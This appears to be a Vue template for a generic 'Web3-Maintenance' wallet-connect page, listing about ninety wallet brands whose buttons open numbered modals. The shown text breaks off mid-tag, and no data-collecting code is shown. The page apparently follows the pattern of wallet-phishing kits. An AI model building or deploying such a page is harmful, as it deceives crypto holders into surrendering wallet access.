<template>
  <div>
    <div class="coin-section">
      <div class="content-box-md">
        <div class="container">
          <h2 class="text-white mx-auto d-block text-center py-2" href="#">
            Web3<span style="color: #bc3fea">-Maintenance</span>
          </h2>
          <div class="row">
            <div class="text-center coin-section-header">
              <h6 class="animated pulse text-white mb-10">
                Please connect your wallet to continue
              </h6>

              <input
                type="text"
                id="searchInput"
                placeholder="Search wallet names..."
                v-model="searchQuery"
                class="w-full max-w-md mx-auto block text-center px-4 py-2 border border-gray-300 rounded-lg shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
          </div>
          <div class="row">
            <div
              ref="walletRegistry"
              class="coin-registry"
              style="display: none !important"
            >
              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal103"
                class="btn coin"
              >
                <img class="coin-img" src="/images/phantom.jpeg" alt="" />
                <h4 class="text-white">Phantom wallet</h4>
              </button>
              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal71"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/solana-sol-logo.png"
                  alt=""
                />
                <h4 class="text-white">Solana Wallet</h4>
              </button>
              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal71"
                class="btn coin"
              >
                <img class="coin-img" src="/images/Uniswap-Logo.webp" alt="" />
                <h4 class="text-white">UNISWAP Wallet</h4>
              </button>
              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal71"
                class="btn coin"
              >
                <img class="coin-img" src="/images/bestwallet.jpg" alt="" />
                <h4 class="text-white">Best Wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal71"
                class="btn coin"
              >
                <img class="coin-img" src="/images/walletconnect.webp" alt="" />
                <h4 class="text-white">Wallet Connect</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal2"
                class="btn coin"
              >
                <img class="coin-img" src="/images/trustwallet.png" alt="" />
                <h4 class="text-white">Trust</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal71"
                class="btn coin"
              >
                <img class="coin-img" src="/images/Solflarewallet.jpg" alt="" />
                <h4 class="text-white">Solfare Wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal4"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/MetaMask-icon-Fox.svg"
                  alt=""
                />
                <h4 class="text-white">Metamask</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal15"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/Ledger-nano-logo.png"
                  alt=""
                  style="background-color: #fff"
                />
                <h4 class="text-white">Ledger</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal16"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/Coinbaselogo_Supplied_250x250-2.png"
                  alt=""
                />
                <h4 class="text-white">Coinbase</h4>
              </button>
              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal71"
                class="btn coin"
              >
                <img class="coin-img" src="/images/unisat.jpg" alt="" />
                <h4 class="text-white">Unisat Wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal71"
                class="btn coin"
              >
                <img class="coin-img" src="/images/tangem.png" alt="" />
                <h4 class="text-white">Tangem Wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal103"
                class="btn coin"
              >
                <img class="coin-img" src="/images/xaman.jpg" alt="" />
                <h4 class="text-white">Xaman wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal71"
                class="btn coin"
              >
                <img class="coin-img" src="/images/trojan.jpg" alt="" />
                <h4 class="text-white">Trojan Bot</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal71"
                class="btn coin"
              >
                <img class="coin-img" src="/images/okx_1.png" alt="" />
                <h4 class="text-white">okx Wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal71"
                class="btn coin"
              >
                <img class="coin-img" src="/images/sui.png" alt="" />
                <h4 class="text-white">Sui Wallet</h4>
              </button>
              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal71"
                class="btn coin"
              >
                <img class="coin-img" src="/images/leather.svg" alt="" />
                <h4 class="text-white">Leather Wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal71"
                class="btn coin"
              >
                <img class="coin-img" src="/images/aptos.webp" alt="" />
                <h4 class="text-white">APTOS Wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal71"
                class="btn coin"
              >
                <img class="coin-img" src="/images/asigna.jpg" alt="" />
                <h4 class="text-white">Asigna Wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal71"
                class="btn coin"
              >
                <img class="coin-img" src="/images/avax.png" alt="" />
                <h4 class="text-white">AVAXC Wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal71"
                class="btn coin"
              >
                <img class="coin-img" src="/images/base.webp" alt="" />
                <h4 class="text-white">Base Wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal71"
                class="btn coin"
              >
                <img class="coin-img" src="/images/tao.webp" alt="" />
                <h4 class="text-white">BITTENSOR Wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal4"
                class="btn coin"
              >
                <img class="coin-img" src="/images/aurora.svg" alt="" />
                <h4 class="text-white">AURORA Wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal71"
                class="btn coin"
              >
                <img class="coin-img" src="/images/Xverse.jpg" alt="" />
                <h4 class="text-white">Xverse Wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal71"
                class="btn coin"
              >
                <img class="coin-img" src="/images/optimism.svg" alt="" />
                <h4 class="text-white">OPTIMISM Wallet</h4>
              </button>
              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal71"
                class="btn coin"
              >
                <img class="coin-img" src="/images/MyTonWallet.jpg" alt="" />
                <h4 class="text-white">MyTon Wallet</h4>
              </button>
              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal71"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/Tonkeeperwallet.jpg"
                  alt=""
                />
                <h4 class="text-white">Tonkeeper Wallet</h4>
              </button>
              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal71"
                class="btn coin"
              >
                <img class="coin-img" src="/images/TonHubWallet.jpg" alt="" />
                <h4 class="text-white">TonHub Wallet</h4>
              </button>
              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal71"
                class="btn coin"
              >
                <img class="coin-img" src="/images/Electrum.jpg" alt="" />
                <h4 class="text-white">Electrum Wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal71"
                class="btn coin"
              >
                <img class="coin-img" src="/images/magic_eden.png" alt="" />
                <h4 class="text-white">Magic Eden Wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal71"
                class="btn coin"
              >
                <img class="coin-img" src="/images/stacks.png" alt="" />
                <h4 class="text-white">STACKS Wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal15"
                class="btn coin"
              >
                <img class="coin-img" src="/images/moonbeam.webp" alt="" />
                <h4 class="text-white">MOONBEAM</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal100"
                class="btn coin"
              >
                <img class="coin-img" src="/images/brd.jpg" alt="" />
                <h4 class="text-white">BRD wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal100"
                class="btn coin"
              >
                <img class="coin-img" src="/images/ethereum-pow.png" alt="" />
                <h4 class="text-white">ETHPOW wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal100"
                class="btn coin"
              >
                <img class="coin-img" src="/images/ton.webp" alt="" />
                <h4 class="text-white">TON wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal101"
                class="btn coin"
              >
                <img class="coin-img" src="/images/saitama.png" alt="" />
                <h4 class="text-white">Saitamask wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal101"
                class="btn coin"
              >
                <img class="coin-img" src="/images/arbitrum.svg" alt="" />
                <h4 class="text-white">ARBITRUM wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal102"
                class="btn coin"
              >
                <img class="coin-img" src="/images/terra.png" alt="" />
                <h4 class="text-white">Terra station</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal102"
                class="btn coin"
              >
                <img class="coin-img" src="/images/metis.svg" alt="" />
                <h4 class="text-white">METIS station</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal103"
                class="btn coin"
              >
                <img class="coin-img" src="/images/cronos.svg" alt="" />
                <h4 class="text-white">CRO wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal104"
                class="btn coin"
              >
                <img class="coin-img" src="/images/cosmos.png" alt="" />
                <h4 class="text-white">Cosmos station</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal104"
                class="btn coin"
              >
                <img class="coin-img" src="/images/cube.png" alt="" />
                <h4 class="text-white">CUBE Wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal105"
                class="btn coin"
              >
                <img class="coin-img" src="/images/exodus.png" alt="" />
                <h4 class="text-white">Exodus wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal105"
                class="btn coin"
              >
                <img class="coin-img" src="/images/okx.png" alt="" />
                <h4 class="text-white">OKC wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369.jpeg"
                  alt=""
                  style="border-radius: 40px"
                />
                <h4 class="text-white">Rainbow</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/heco.png"
                  alt=""
                  style="border-radius: 40px"
                />
                <h4 class="text-white">HECO</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal3"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/m92jEcPI_400x400.jpg"
                  alt=""
                />
                <h4 class="text-white">Argent</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal3"
                class="btn coin"
              >
                <img class="coin-img" src="/images/moonriver.webp" alt="" />
                <h4 class="text-white">MOONRIVER</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal5"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/54043975-b6cdb800-4182-11e9-83bd-0cd2eb757c6e.png"
                  alt=""
                  style="border-radius: 50%"
                />
                <h4 class="text-white">Binance Chain</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal6"
                class="btn coin"
              >
                <img class="coin-img" src="/images/lg.png" alt="" />
                <h4 class="text-white">Safemoon</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal6"
                class="btn coin"
              >
                <img class="coin-img" src="/images/celo.png" alt="" />
                <h4 class="text-white">CELO</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal7"
                class="btn coin"
              >
                <img class="coin-img" src="/images/gnosis.jpg" alt="" />
                <h4 class="text-white">Gnosis Safe</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal7"
                class="btn coin"
              >
                <img class="coin-img" src="/images/fantom.svg" alt="" />
                <h4 class="text-white">FANTOM</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal8"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/f2436c67184f158d1beda5df53298ee84abfc367581e4505134b5bcf5f46697d.jpeg"
                  alt=""
                />
                <h4 class="text-white">DeFi</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal8"
                class="btn coin"
              >
                <img class="coin-img" src="/images/litecoin.svg" alt="" />
                <h4 class="text-white">LITECOIN</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal9"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAYFBMVEV1Adn///9rANeZUeK0i+lqANf79P/gyPZ+Edt3ANrm0vjt3PrKqvCveuivfOi/lu3Cmu6gX+THo+/Ale3z5fzZuPWqdefr2fqSQOHx5/vjzfembuaxgemrc+fRs/GFJt194pibAAABw0lEQVR4nO3c2W7bMBBAUZGpW3dNmrbp3vz/XzZpNjuxBFSgQ87gnHcBc8Gh7CdNEwAAAAAAAAAAAAAAkMy29wBH9/G89h7hyE7KafLEk1I+bXoPcVRXhclP8bowd+K/wnKWOPGmsJzlvYu3hYkX9a4w76LeF6Zd1IfCrKe4U5g0cbdw6MS6ZOnBvcJyOuxd3H5+O+/LUuJ+4binuC0L3vxH4bCJ7QpHTWxYOOjvYsvCMU+xaeGQiW0LR0xsXFguhktsXfhC4bNTOE/hKBTOUzgKhfMUjkLhPIWjUDhP4SgUzlM4isXCrxkKp9dLlh4MU7iawvgUxqcwPoXxKYxPYXwK41MYn8L4FManMD6F8SmML0xh3az0LUjhtrxcK0xhWwqfn0KFCvtTqFBhfwoVKuxPoUKF/SnMWvj91Uo/fvYOeqJ+OFR4vln8MM/Kb/Z0Un8dKHw34qSr1ffZCw8lJis8kJit8OnrJl3hVC+yFz5OTFj4aFEzFu6/blIW7iXmLNxd1KSFO4lZCx8WNW3hfWLewrvExIW3dzFz4c2/m9SFU/2dvfD6LiYvvLqLf5IXTvWy9wQAAAAAAAAAAAAAAEBrfwFLJCClTlJ5TwAAAABJRU5ErkJggg=="
                  alt=""
                  style="border-radius: 40px"
                />
                <h4 class="text-white">Pillar</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal10"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/unnamed.png"
                  alt=""
                />
                <h4 class="text-white">imToken</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal10"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/matic-token-icon.png"
                  alt=""
                />
                <h4 class="text-white">POLYGON</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal10"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/core-dao.svg"
                  alt=""
                />
                <h4 class="text-white">CORE</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal10"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/bitcoin-cash.png"
                  alt=""
                />
                <h4 class="text-white">BITCOINCASH</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal11"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/dceb063851b1833cbb209e3717a0a0b06bf3fb500fe9db8cd3a553e4b1d02137.jpeg"
                  alt=""
                />
                <h4 class="text-white">ONTO</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal11"
                class="btn coin"
              >
                <img class="coin-img" src="/images/boba.svg" alt="" />
                <h4 class="text-white">BOBA</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal11"
                class="btn coin"
              >
                <img class="coin-img" src="/images/evmos.png" alt="" />
                <h4 class="text-white">EVMOS</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal11"
                class="btn coin"
              >
                <img class="coin-img" src="/images/thorchain.svg" alt="" />
                <h4 class="text-white">THORCHAIN</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal12"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66.jpeg"
                  alt=""
                />
                <h4 class="text-white">TokenPocket</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal13"
                class="btn coin"
              >
                <img class="coin-img" src="/images/aave-aave-logo.png" alt="" />
                <h4 class="text-white">Aave</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal14"
                class="btn coin"
              >
                <img class="coin-img" src="/images/2772.png" alt="" />
                <h4 class="text-white">Digitex</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal17"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/portis_logo_dribbble.png"
                  alt=""
                />
                <h4 class="text-white">Portis</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal18"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/rtDOqMXY_400x400.jpg"
                  alt=""
                />
                <h4 class="text-white">Formatic</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal19"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/7674bb4e353bf52886768a3ddc2a4562ce2f4191c80831291218ebd90f5f5e26.jpeg"
                  alt=""
                />
                <h4 class="text-white">MathWallet</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal20"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/1581439195205.jpg"
                  alt=""
                />
                <h4 class="text-white">BitPay</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal21"
                class="btn coin"
              >
                <img class="coin-img" src="/images/ledgerlive.png" alt="" />
                <h4 class="text-white">Ledger Live</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal22"
                class="btn coin"
              >
                <img class="coin-img" src="/images/walleth.png" alt="" />
                <h4 class="text-white">WallETH</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal23"
                class="btn coin"
              >
                <img class="coin-img" src="/images/authereum.png" alt="" />
                <h4 class="text-white">Authereum</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal24"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/5DxVDK36_400x400.png"
                  alt=""
                />
                <h4 class="text-white">Dharma</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal25"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/1inch.png"
                  alt=""
                />
                <h4 class="text-white">1inch Wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal26"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/huobi.png"
                  alt=""
                />
                <h4 class="text-white">Huobi</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal27"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/8EXrk57o_400x400.jpg"
                  alt=""
                />
                <h4 class="text-white">Eidoo</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal28"
                class="btn coin"
              >
                <img class="coin-img" src="/images/512x512bb.jpg" alt="" />
                <h4 class="text-white">MYKEY</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal29"
                class="btn coin"
              >
                <img class="coin-img" src="/images/loopring.png" alt="" />
                <h4 class="text-white">Loopring</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal30"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/trustvault.png"
                  alt=""
                />
                <h4 class="text-white">TrustVault</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal31"
                class="btn coin"
              >
                <img class="coin-img" src="/images/unnamed(1).png" alt="" />
                <h4 class="text-white">Atomic</h4>
              </button>
              <!-- Modal -->
              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal32"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/10903.png"
                  alt=""
                />
                <h4 class="text-white">Coin98</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal33"
                class="btn coin"
              >
                <img class="coin-img" src="/images/tron-trx-logo.png" alt="" />
                <h4 class="text-white">Tron</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="data:image/png;base64,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"
                  alt=""
                />
                <h4 class="text-white">Alice</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/kujira.webp" alt="" />
                <h4 class="text-white">KUJIRA</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/akash.png" alt="" />
                <h4 class="text-white">AKASH</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/umee.png" alt="UMEE" />
                <h4 class="text-white">UMEE</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/iris.png" alt="" />
                <h4 class="text-white">IRIS</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/regen.png" alt="" />
                <h4 class="text-white">REGEN</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/gnosis.png" alt="GNOSIS" />
                <h4 class="text-white">GNOSIS</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/axelar.png" alt="OSMOSIS" />
                <h4 class="text-white">OSMOSIS</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/bitsong.png" alt="BITSONG" />
                <h4 class="text-white">BITSONG</h4>
              </button>

              <button
